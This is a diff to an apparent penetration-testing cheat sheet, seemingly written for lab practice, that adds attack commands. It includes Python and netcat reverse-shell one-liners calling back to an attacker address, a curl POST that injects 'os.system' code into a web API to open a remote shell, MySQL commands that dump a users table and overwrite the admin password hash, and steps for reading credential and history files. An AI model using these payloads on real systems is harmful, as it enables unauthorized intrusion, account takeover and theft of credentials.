@@ -2,6 +2,11 @@
 - [General](#general)
   - [Important Files](#important-files)
   - [Reverse Shell](#reverse-shell)
+- [SQL](#sql)
+  - [MYSQL](#mysql)
+- [Tools](#tools)
+  - [feroxbuster](#feroxbuster)
+  - [gobuster](#gobuster)
 - [SSH](#ssh)
   - [SSH KEY](#ssh-key)
   - [SSH Tunneling](#ssh-tunneling)
@@ -44,7 +49,22 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.x",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 # when escaping double quotes
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.175\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'
+# when using os
+os.system('nc 192.168.45.175 80 -e /bin/sh')
 ```
+
+# SQL
+## MYSQL
+```bash
+mysql -u 'root' -h 192.168.183.122 -p
+show databases;
+use user;
+show tables;
+select * from users_secure;
+update users_secure SET password="$2y$10$R0cpsKNLDqDZpfxDCaq8Qufxl0uLbmwiL0k6XDR1kPBDXVIYbeQ0W" WHERE username="admin"
+```
+
+
 
 ## Tools
 ### feroxbuster 
@@ -107,7 +127,25 @@ ssh -N -R 9998 kali@192.168.118.4
 
 # Web Attacks
 
-## input form
+## When it's api response
+```bash
+# curl -v can give you more information about this api
+curl -v http://192.168.x.x:port
+
+# Try sending get request to any found apis with found or possible argument
+http://192.168.183.117:50000/verify?code=os
+
+# Try sending post request to any found apis
+curl -X post --data "code=2*2" http://192.168.183.117:50000/verify --proxy 127.0.0.1:8080
+curl -X post --data "code=os.system('nc 192.168.45.175 80 -e /bin/sh')" http://192.168.183.117:50000/verify --proxy 127.0.0.1:8080
+```
+
+## When it's using Filemanater
+- See if any directory is showing same contents as ohter ports like FTP, SMB
+- If our key file we should obtain is php file, we can't read it on the web so likely that we need to transfer it to FTP,SMB so make sure if any directory can be searched through smb/ftp
+- When we're changing download path, try ./Documents/ or /Documents/ or Documents/
+
+## Input form
 - Input form: check with burpsuite
 - SQLi
 - Check to see if we can modify post data
@@ -253,6 +291,9 @@ hostname
 # Check User files(Everyone if you can)
 cat /home/user/.bash_aliases
 cat /home/user/.bash_history
+
+# Check config files
+/var/www/html/sites/default/config.php
 
 # Enumerate other userse(This is really important because we might have to pivot to other users)
 cat /etc/passwd
